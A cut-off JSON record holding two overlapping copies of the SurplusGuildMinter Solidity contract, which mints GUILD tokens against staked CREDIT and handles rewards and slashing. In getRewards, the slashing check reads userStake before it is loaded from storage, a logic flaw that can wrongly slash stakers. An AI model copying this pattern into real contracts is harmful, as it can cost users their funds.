Unstake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user is rewarded GUILD from non-zero interest\n    /// rate and closing their position without loss.\n    event GuildReward(\n        uint256 indexed timestamp,\n        address indexed user,\n        uint256 amount\n    );\n    /// @notice emitted when the mintRatio is updated\n    event MintRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n    /// @notice emitted when the rewardRatio is updated\n    event RewardRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n\n    /// @notice reference to the ProfitManager\n    address public immutable profitManager;\n\n    /// @notice reference to the CREDIT token\n    address public immutable credit;\n\n    /// @notice reference to the GUILD token\n    address public immutable guild;\n\n    /// @notice reference to the RateLimitedGuildMinter\n    address public immutable rlgm;\n\n    /// @notice ratio of GUILD tokens minted per CREDIT tokens staked.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes 1e18 CREDIT tokens.\n    uint256 public mintRatio;\n\n    /// @notice ratio of GUILD tokens earned per CREDIT tokens earned.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes earned 1e18 CREDIT tokens.\n    uint256 public rewardRatio;\n\n    struct UserStake {\n        uint48 stakeTime;\n        uint48 lastGaugeLoss;\n        uint160 profitIndex;\n        uint128 credit;\n        uint128 guild;\n    }\n\n    /// @notice list of user stakes (stakes[user][term]=UserStake)\n    mapping(address => mapping(address => UserStake)) internal _stakes;\n\n    constructor(\n        address _core,\n        address _profitManager,\n        address _credit,\n        address _guild,\n        address _rlgm,\n        uint256 _mintRatio,\n        uint256 _rewardRatio\n    ) CoreRef(_core) {\n        profitManager = _profitManager;\n        credit = _credit;\n        guild = _guild;\n        rlgm = _rlgm;\n        mintRatio = _mintRatio;\n        rewardRatio = _rewardRatio;\n    }\n\n    /// @notice get a given user stake\n    function getUserStake(\n        address user,\n        address term\n    ) external view returns (UserStake memory) {\n        return _stakes[user][term];\n    }\n\n    /// @notice stake CREDIT tokens to start voting in a gauge.\n    function stake(address term, uint256 amount) external whenNotPaused {\n        // apply pending rewards\n        (uint256 lastGaugeLoss, UserStake memory userStake, ) = getRewards(\n            msg.sender,\n            term\n        );\n\n        require(\n            lastGaugeLoss != block.timestamp,\n            \"SurplusGuildMinter: loss in block\"\n        );\n        require(amount >= MIN_STAKE, \"SurplusGuildMinter: min stake\");\n\n        // pull CREDIT from user & transfer it to surplus buffer\n        CreditToken(credit).transferFrom(msg.sender, address(this), amount);\n        CreditToken(credit).approve(address(profitManager), amount);\n        ProfitManager(profitManager).donateToTermSurplusBuffer(term, amount);\n\n        // self-mint GUILD tokens\n        uint256 _mintRatio = mintRatio;\n        uint256 guildAmount = (_mintRatio * amount) / 1e18;\n        RateLimitedMinter(rlgm).mint(address(this), guildAmount);\n        GuildToken(guild).incrementGauge(term, guildAmount);\n\n        // update state\n        userStake = UserStake({\n            stakeTime: SafeCastLib.safeCastTo48(block.timestamp),\n            lastGaugeLoss: SafeCastLib.safeCastTo48(lastGaugeLoss),\n            profitIndex: SafeCastLib.safeCastTo160(\n                ProfitManager(profitManager).userGaugeProfitIndex(\n                    address(this),\n                    term\n                )\n            ),\n            credit: userStake.credit + SafeCastLib.safeCastTo128(amount),\n            guild: userStake.guild + SafeCastLib.safeCastTo128(guildAmount)\n        });\n        _stakes[msg.sender][term] = userStake;\n\n        // emit event\n        emit Stake(block.timestamp, term, amount);\n    }\n\n    /// @notice unstake CREDIT tokens and stop voting in a gauge.\n    function unstake(address term, uint256 amount) external {\n        // apply pending rewards\n        (, UserStake memory userStake, bool slashed) = getRewards(\n            msg.sender,\n            term\n        );\n\n        // if the user has been slashed, there is nothing to do\n        if (slashed) return;\n\n        // check that the user is at least staking `amount` CREDIT\n        require(\n            amount != 0 && userStake.credit >= amount,\n            \"SurplusGuildMinter: invalid amount\"\n        );\n\n        // update stake\n        uint256 userMintRatio = (uint256(userStake.guild) * 1e18) /\n            userStake.credit; /// upcast guild to prevent overflow\n        uint256 guildAmount = (userMintRatio * amount) / 1e18;\n\n        if (amount == userStake.credit) guildAmount = userStake.guild;\n\n        userStake.credit -= SafeCastLib.safeCastTo128(amount);\n        userStake.guild -= SafeCastLib.safeCastTo128(guildAmount);\n\n        if (userStake.credit == 0) {\n            userStake.stakeTime = 0;\n            userStake.lastGaugeLoss = 0;\n            userStake.profitIndex = 0;\n        } else {\n            // if not unstaking all, make sure the stake remains\n            // greater than the minimum stake\n            require(\n                userStake.credit >= MIN_STAKE,\n                \"SurplusGuildMinter: remaining stake below min\"\n            );\n        }\n        _stakes[msg.sender][term] = userStake;\n\n        // withdraw & transfer CREDIT\n        ProfitManager(profitManager).withdrawFromTermSurplusBuffer(\n            term,\n            msg.sender,\n            amount\n        );\n\n        // burn GUILD\n        GuildToken(guild).decrementGauge(term, guildAmount);\n        RateLimitedMinter(rlgm).replenishBuffer(guildAmount);\n        GuildToken(guild).burn(guildAmount);\n\n        // emit event\n        emit Unstake(block.timestamp, term, amount);\n    }\n\n    /// @notice get rewards from a staking position without unstaking.\n    /// This can be used to slash users that have an outstanding unapplied loss.\n    function getRewards(\n        address user,\n        address term\n    )\n        public\n        returns (\n            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)\n            UserStake memory userStake, // stake state after execution of getRewards()\n            bool slashed // true if the user has been slashed\n        )\n    {\n        bool updateState;\n        lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);\n        if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {\n            slashed = true;\n        }\n\n        // if the user is not staking, do nothing\n        userStake = _stakes[user][term];\n        if (userStake.stakeTime == 0)\n            return (lastGaugeLoss, userStake, slashed);\n\n        // compute CREDIT rewards\n        ProfitManager(profitManager).claimRewards(address(this)); // this will update profit indexes\n        uint256 _profitIndex = ProfitManager(profitManager)\n            .userGaugeProfitIndex(address(this), term);\n        uint256 _userProfitIndex = uint256(userStake.profitIndex);\n\n        if (_profitIndex == 0) _profitIndex = 1e18;\n        if (_userProfitIndex == 0) _userProfitIndex = 1e18;\n\n        uint256 deltaIndex = _profitIndex - _userProfitIndex;\n\n        if (deltaIndex != 0) {\n            uint256 creditReward = (uint256(userStake.guild) * deltaIndex) /\n                1e18;\n            uint256 guildReward = (creditReward * rewardRatio) / 1e18;\n            if (slashed) {\n                guildReward = 0;\n            }\n\n            // forward rewards to user\n            if (guildReward != 0) {\n                RateLimitedMinter(rlgm).mint(user, guildReward);\n                emit GuildReward(block.timestamp, user, guildReward);\n            }\n            if (creditReward != 0) {\n                CreditToken(credit).transfer(user, creditReward);\n            }\n\n            // save the updated profitIndex\n            userStake.profitIndex = SafeCastLib.safeCastTo160(_profitIndex);\n            updateState = true;\n        }\n\n        // if a loss occurred while the user was staking, the GuildToken.applyGaugeLoss(address(this))\n        // can be called by anyone to slash address(this) and decrement gauge weight etc.\n        // The contribution to the surplus buffer is also forfeited.\n        if (slashed) {\n            emit Unstake(block.timestamp, term, uint256(userStake.credit));\n            userStake = UserStake({\n                stakeTime: uint48(0),\n                lastGaugeLoss: uint48(0),\n                profitIndex: uint160(0),\n                credit: uint128(0),\n                guild: uint128(0)\n            });\n            updateState = true;\n        }\n\n        // store the updated stake, if needed\n        if (updateState) {\n            _stakes[user][term] = userStake;\n        }\n    }\n\n    /// @notice update the mint ratio for a given user.\n    function updateMintRatio(address user, address term) external {\n        // apply pending rewards\n        (, UserStake memory userStake, bool slashed) = getRewards(user, term);\n\n        // if the user has been slashed or isnt staking, there is nothing to do\n        if (userStake.stakeTime == 0 || slashed) return;\n\n        // update amount of GUILD tokens staked\n        uint256 guildBefore = uint256(userStake.guild);\n        uint256 guildAfter = (mintRatio * uint256(userStake.credit)) / 1e18;\n        if (guildAfter > guildBefore) {\n            uint256 guildAmount = guildAfter - guildBefore;\n            RateLimitedMinter(rlgm).mint(address(this), guildAmount);\n            GuildToken(guild).incrementGauge(term, guildAmount);\n            _stakes[user][term].guild = SafeCastLib.safeCastTo128(guildAfter);\n        } else if (guildAfter < guildBefore) {\n            uint256 guildAmount = guildBefore - guildAfter;\n            GuildToken(guild).decrementGauge(term, guildAmount);\n            RateLimitedMinter(rlgm).replenishBuffer(guildAmount);\n            GuildToken(guild).burn(guildAmount);\n            _stakes[user][term].guild = SafeCastLib.safeCastTo128(guildAfter);\n        }\n    }\n\n    /// @notice governor-only function to set the ratio of GUILD tokens minted\n    /// per CREDIT tokens contributed to the surplus buffer.\n    function setMintRatio(\n        uint256 _mintRatio\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        mintRatio = _mintRatio;\n        emit MintRatioUpdate(block.timestamp, _mintRatio);\n    }\n\n    /// @notice governor-only function to set the ratio of GUILD tokens rewarded\n    /// per CREDIT tokens earned from GUILD staking.\n    function setRewardRatio(\n        uint256 _rewardRatio\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        rewardRatio = _rewardRatio;\n        emit RewardRatioUpdate(block.timestamp, _rewardRatio);\n    }\n}"
    },
    {
      "filename": "src/loan/SurplusGuildMinter.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {SafeCastLib} from \"@src/external/solmate/SafeCastLib.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\n/// @notice SurplusGuildMinter allows GUILD to be minted from CREDIT collateral.\n/// In this contract, CREDIT tokens can be provided as first-loss capital to\n/// the surplus buffer of chosen terms, and in exchange, users can participate in the\n/// gauge voting system at a reduced capital cost & without exposure to GUILD\n/// token's price fluctuations. GUILD minted through this contract can only\n/// participate in the gauge system to increase debt ceiling and earn fees\n/// from selected lending terms.\n/// @dev note that any update to the `rewardRatio` (through `setRewardRatio`) will\n/// change the rewards of all pending unclaimed rewards. Before a proposal to update\n/// the reward ratio execute, this contract should be pinged with `getRewards` for\n/// all users that have pending rewards.\ncontract SurplusGuildMinter is CoreRef {\n    /// @notice minimum number of CREDIT to stake\n    uint256 public constant MIN_STAKE = 1e18;\n\n    /// @notice reference number of seconds in 1 year\n    uint256 public constant YEAR = 31557600;\n\n    /// @notice emitted when a user stakes CREDIT on a target lending term\n    event Stake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user unstakes CREDIT on a target lending term\n    event Unstake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user is rewarded GUILD from non-zero interest\n    /// rate and closing their position without loss.\n    event GuildReward(\n        uint256 indexed timestamp,\n        address indexed user,\n        uint256 amount\n    );\n    /// @notice emitted when the mintRatio is updated\n    event MintRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n    /// @notice emitted when the rewardRatio is updated\n    event RewardRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n\n    /// @notice reference to the ProfitManager\n    address public immutable profitManager;\n\n    /// @notice reference to the CREDIT token\n    address public immutable credit;\n\n    /// @notice reference to the GUILD token\n    address public immutable guild;\n\n    /// @notice reference to the RateLimitedGuildMinter\n    address public immutable rlgm;\n\n    /// @notice ratio of GUILD tokens minted per CREDIT tokens staked.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes 1e18 CREDIT tokens.\n    uint256 public mintRatio;\n\n    /// @notice ratio of GUILD tokens earned per CREDIT tokens earned.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes earned 1e18 CREDIT tokens.\n    uint256 public rewardRatio;\n\n    struct UserStake {\n        uint48 stakeTime;\n        uint48 lastGaugeLoss;\n        uint160 profitIndex;\n        uint128 credit;\n        uint128 guild;\n    }\n\n    /// @notice list of user stakes (stakes[user][term]=UserStake)\n    mapping(address => mapping(address => UserStake)) internal _stakes;\n\n    constructor(\n        address _core,\n        address _profitManager,\n        address _credit,\n        address _guild,\n        address _rlgm,\n        uint256 _mintRatio,\n        uint256 _rewardRatio\n    ) CoreRef(_core) {\n        profitManager = _profitManager;\n        credit = _credit;\n        guild = _guild;\n        rlgm = _rlgm;\n        mintRatio = _mintRatio;\n        rewardRatio = _rewardRatio;\n    }\n\n    /// @notice get a given user stake\n    function getUserStake(\n        address user,\n        address term\n    ) external view returns (UserStake memory) {\n        return _stakes[user][term];\n    }\n\n    /// @notice stake CREDIT tokens to start voting in a gauge.\n    function stake(address term, uint256 amount) external whenNotPaused {\n        // apply pending rewards\n        (uint256 lastGaugeLoss, UserStake memory userStake, ) = getRewards(\n            msg.sender,\n            term\n        );\n\n        require(\n            lastGaugeLoss != block.timestamp,\n            \"SurplusGuildMinter: loss in block\"\n        );\n        require(amount >= MIN_STAKE, \"SurplusGuildMinter: min stake\");\n\n        // pull CREDIT from user & transfer it to surplus buffer\n        CreditToken(credit).transferFrom(msg.sender, address(this), amount);\n        CreditToken(credit).approve(address(profitManager), amount);\n        ProfitManager(profitManager).donateToTermSurplusBuffer(term, amount);\n\n        // self-mint GUILD tokens\n        uint256 _mintRatio = mintRatio;\n        uint256 guildAmount = (_mintRatio * amount) / 1e18;\n        RateLimitedMinter(rlgm).mint(address(this), guildAmount);\n        GuildToken(guild).incrementGauge(term, guildAmount);\n\n        // update state\n        userStake = UserStake({\n            stakeTime: SafeCastLib.safeCastTo48(block.timestamp),\n            lastGaugeLoss: SafeCastLib.safeCastTo48(lastGaugeLoss),\n            profitIndex: SafeCastLib.safeCastTo160(\n                ProfitManager(profitManager).userGaugeProfitIndex(\n                    address(this),\n                    term\n                )\n            ),\n            credit: userStake.credit + SafeCastLib.safeCastTo128(amount),\n            guild: userStake.guild + SafeCastLib.safeCastTo128(guildAmount)\n        });\n        _stakes[msg.sender][term] = userStake;\n\n        // emit event\n        emit Stake(block.timestamp, term, amount);\n    }\n\n    /// @notice unstake CREDIT tokens and stop voting in a gauge.\n    function unstake(address term, uint256 amount) external {\n        // apply pending rewards\n        (, UserStake memory userStake, bool slashed) = getRewards(\n            msg.sender,\n            term\n        );\n\n        // if the user has been slashed, there is nothing to do\n        if (slashed) return;\n\n        // check that the user is at least staking `amount` CREDIT\n        require(\n            amount != 0 && userStake.credit >= amount,\n            \"SurplusGuildMinter: invalid amount\"\n        );\n\n        // update stake\n        uint256 userMintRatio = (uint256(userStake.guild) * 1e18) /\n            userStake.credit; /// upcast guild to prevent overflow\n        uint256 guildAmount = (userMintRatio * amount) / 1e18;\n\n        if (amount == userStake.credit) guildAmount = userStake.guild;\n\n        userStake.credit -= SafeCastLib.safeCastTo128(amount);\n        userStake.guild -= SafeCastLib.safeCastTo128(guildAmount);\n\n        if (userStake.credit == 0) {\n            userStake.stakeTime = 0;\n            userStake.lastGaugeLoss = 0;\n            userStake.profitIndex = 0;\n        } else {\n            // if not unstaking all, make sure the stake remains\n            // greater than the minimum stake\n            require(\n                userStake.credit >= MIN_STAKE,\n                \"Surp"
    }
  ]
}